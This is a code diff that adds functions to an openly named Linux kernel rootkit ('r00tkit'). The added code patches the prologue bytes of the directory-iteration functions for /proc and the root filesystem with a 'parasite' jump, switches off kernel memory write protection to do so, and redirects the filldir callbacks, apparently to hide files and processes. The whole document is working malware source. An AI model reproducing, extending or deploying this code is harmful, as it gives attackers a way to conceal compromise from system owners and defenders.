@@ -416,3 +416,163 @@ static int r00tkit_rootfs_filldir(void *_buf,
 	return org_rootfs_filldir(_buf,name,namelen,offset,ino,d_type);
 }
 
+
+
+
+/*
+******************************************************************************************
+each hooked function is represented by a hooked_function_info
+structure that records all info related to the hooked function
+(it's original address ,it's original first bytes,etc ...)
+the rootkit keeps track of all hooked functions by
+implementing a doubly linked list of hooked_function_info structures
+******************************************************************************************
+*/
+
+LIST_HEAD(hooked_functions_listhead);
+
+//instead of code repeating
+#define define_r00tkit_inlinehook_iterate(targetfs)							\
+		static int r00tkit_##targetfs##_inlinehook_iterate(struct file *fp,			\
+								   struct dir_context *ctx)		\
+		{											\
+			int retval;									\
+			struct r00tkit_dircontext *r00tkit_ctx = (struct r00tkit_dircontext *)ctx;	\
+			org_##targetfs##_filldir = r00tkit_ctx->actor;					\
+			r00tkit_ctx->actor = (filldir_t)r00tkit_##targetfs##_filldir;			\
+			r00tkit_parasite(org_##targetfs##_iterate,REMOVE_PARASITE);			\
+			retval = org_##targetfs##_iterate(fp,(struct dir_context *)r00tkit_ctx);	\
+			r00tkit_parasite(org_##targetfs##_iterate,INSTALL_PARASITE);			\
+			return retval;									\
+		}
+
+
+
+define_r00tkit_inlinehook_iterate(procfs)
+define_r00tkit_inlinehook_iterate(rootfs)
+
+
+/*
+[]allocate a hooked_function_info struct
+[]fill it with relevant info for the target function
+[]add to the list of hooked functions
+*/
+static int r00tkit_hooklist_add(void *target_func_addr,void *r00tkit_func)
+{
+		char parasite[PARASITE_LEN] = PARASITE;
+		struct hooked_function_info *hook;
+
+		hook = (struct hooked_function_info *)kmalloc(sizeof(struct hooked_function_info),GFP_KERNEL);
+
+		if (hook == NULL)
+			return 0;
+
+
+		//replace zeros with address of rootkit's function
+		*((unsigned long *)(&parasite[PARASITE_ADDROFF])) = (unsigned long)r00tkit_func;
+
+		/*
+		[]fill in hooked_functions_info struct of this targeted function. 
+		[]add to the list of hooked functions 
+		*/
+		memcpy(hook->parasite,parasite,PARASITE_LEN);
+		memcpy(hook->org_code,target_func_addr,PARASITE_LEN);
+
+		hook->hooked_function_addr = target_func_addr;
+
+		list_add(&hook->hook_list,&hooked_functions_listhead);
+
+		return 1;
+}
+
+
+/*
+replace target function's prologue bytes with rootkits's parasite
+if install_parasite = INSTALL_PARASITE
+
+restore target function's prologue bytes if install_parasite = REMOVE_PARASITE
+*/
+static void r00tkit_parasite(void *target_func_addr,unsigned char install_parasite)
+{
+	struct hooked_function_info *hook;
+ 
+	//we can't leave cpu while hijacking the targtet function bytes
+	preempt_disable();
+
+	unprotect_memory();
+			
+	list_for_each_entry(hook,&hooked_functions_listhead,hook_list)
+	{
+		if (hook->hooked_function_addr == target_func_addr)
+		{
+
+			if (install_parasite)
+			{
+				memcpy(target_func_addr,hook->parasite,PARASITE_LEN);
+			}else
+			{
+				memcpy(target_func_addr,hook->org_code,PARASITE_LEN);
+			}
+		}
+	}
+
+	protect_memory();
+
+	preempt_enable();
+}
+
+
+static int r00tkit_do_hook()
+{
+	struct file *procfs_fp,*rootfs_fp;
+	struct file_operations *procfs_fops,*rootfs_fops;
+
+	if (((procfs_fp = filp_open("/proc",O_RDONLY,0)) == NULL) || 
+					((rootfs_fp = filp_open("/",O_RDONLY,0)) == NULL))
+		return 0;
+
+	procfs_fops = (struct file_operations *)procfs_fp->f_op;
+	rootfs_fops = (struct file_operations *)rootfs_fp->f_op;
+
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,7,0)
+
+	org_procfs_iterate = procfs_fops->iterate_shared;
+	org_rootfs_iterate = rootfs_fops->iterate_shared;
+
+#else
+
+	org_procfs_iterate = procfs_fops->iterate;
+	org_rootfs_iterate = rootfs_fops->iterate;
+
+#endif 
+
+	if (!r00tkit_hooklist_add(org_procfs_iterate,r00tkit_procfs_inlinehook_iterate) ||
+			!r00tkit_hooklist_add(org_rootfs_iterate,r00tkit_rootfs_inlinehook_iterate))
+		return 0;
+
+	r00tkit_parasite(org_procfs_iterate,INSTALL_PARASITE);
+	r00tkit_parasite(org_rootfs_iterate,INSTALL_PARASITE);
+	
+	filp_close(procfs_fp,0);
+	filp_close(rootfs_fp,0);
+
+	return 1;
+}
+
+static void r00tkit_undo_hook()
+{
+	struct hooked_function_info *current_hooked,*next_hooked;
+
+	r00tkit_parasite(org_procfs_iterate,REMOVE_PARASITE);
+	r00tkit_parasite(org_rootfs_iterate,REMOVE_PARASITE);
+
+	//free the list of hooked functions
+	list_for_each_entry_safe(current_hooked,next_hooked,&hooked_functions_listhead,hook_list)
+	{
+		list_del(&current_hooked->hook_list);
+		kfree(current_hooked);
+	}
+
+}
+
